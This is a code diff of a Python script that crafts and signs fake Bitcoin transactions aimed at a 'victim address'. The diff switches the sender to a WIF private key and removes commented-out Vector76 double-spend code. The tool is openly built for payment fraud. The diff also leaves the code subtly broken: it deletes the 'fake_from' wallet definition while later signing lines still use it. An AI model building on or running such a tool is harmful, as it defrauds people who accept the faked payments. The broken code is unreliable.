@@ -21,8 +21,8 @@ parser.add_argument("username",
 parser.add_argument("password",
                     help="Your BTC node password",
                     type=str)
-parser.add_argument("send_from",
-                    help="Fake send btc from deposited address. (Recommend = rich list)",
+parser.add_argument("send_from_wifkey",
+                    help="Fake send btc from wif key.",
                     type=str)
 parser.add_argument("send_to",
                     help="Fake send btc to victim address.",
@@ -63,7 +63,7 @@ rpc_host = args.node_host
 rpc_port = args.node_port
 username = args.username
 password = args.password
-from_address   = args.send_from
+fake_send_from   = args.send_from_wifkey
 victim_address   = args.send_to
 amount_btc = args.amount_of_coins
 testnet    = args.is_testnet
@@ -74,9 +74,8 @@ rpc_node = bitcoin.rpc.Proxy(service_url=f"http://{username}:{password}@{rpc_hos
                  service_port=rpc_port)
 print("OK")
 print()
-fake_from = Wallet()
-balance = transaction_util.get_balance(from_address)
-inputs  = transaction_util.unspent(from_address)
+balance = transaction_util.get_balance(transaction_util.wiftoaddr(fake_send_from))
+inputs  = transaction_util.unspent(transaction_util.wiftoaddr(fake_send_from))
     #balance = transaction_util.get_balance(send_from)
 if balance["confirmed"] <= 0:
     balance = balance["unconfirmed"]
@@ -84,10 +83,6 @@ else:
     balance = balance["confirmed"]
 
 fake_hash = hashlib.sha256(str(uuid.uuid4()).encode()).hexdigest()
-if testnet:
-    inputs[0]["address"] = fake_from.address.testnet.pubaddr1
-else:
-    inputs[0]["address"] = fake_from.address.mainnet.pubaddr1
 
 if amount_btc > 10:
     print(f"[!] Fake remittance amount exceeds 10BTC.")
@@ -96,25 +91,14 @@ if amount_btc > 10:
 send_amount = to_satoshi(amount_btc)
 change_btc_amt = (balance - send_amount) #おつり
 if testnet:
-    tx_victim = [{"address": victim_address, "value": send_amount}, {"address": inputs[0]["address"], "value": change_btc_amt}]
+    tx_victim = [{"address": victim_address, "value": send_amount}, {"address": transaction_util.wiftoaddr(fake_send_from), "value": change_btc_amt}]
 else:
-    tx_victim = [{"address": victim_address, "value": send_amount}, {"address": inputs[0]["address"], "value": change_btc_amt}]
+    tx_victim = [{"address": victim_address, "value": send_amount}, {"address": transaction_util.wiftoaddr(fake_send_from), "value": change_btc_amt}]
 
 tx_victim = transaction_util.mktx(inputs, tx_victim)
 tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_from.key.mainnet.wif))
 if testnet:
     tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_from.key.testnet.wif))
-#print(tx_victim)
-#tx_attacker = [{"address": attacker_address, "value": send_amount}, {"address": change_address, "value": change_btc_amt}]
-#tx_attacker = transaction_util.mktx(inputs, tx_attacker)
-#tx_attacker["ins"][0]["prev_hash"] = last_txid
-#tx_attacker = cryptos.serialize(transaction_util.sign(tx_attacker, 0, key))
-#print()
-#print(tx_attacker)
-#print()
-#tx_vector76 = f"{tx_attacker}{tx_victim}"
-#tx_vector76 = cryptos.serialize(transaction_util.sign(tx_vector76, 0, key))
-#print(tx_vector76)
 print()
 print("--------------------")
 print(f"Fake Send to                       : {victim_address}")
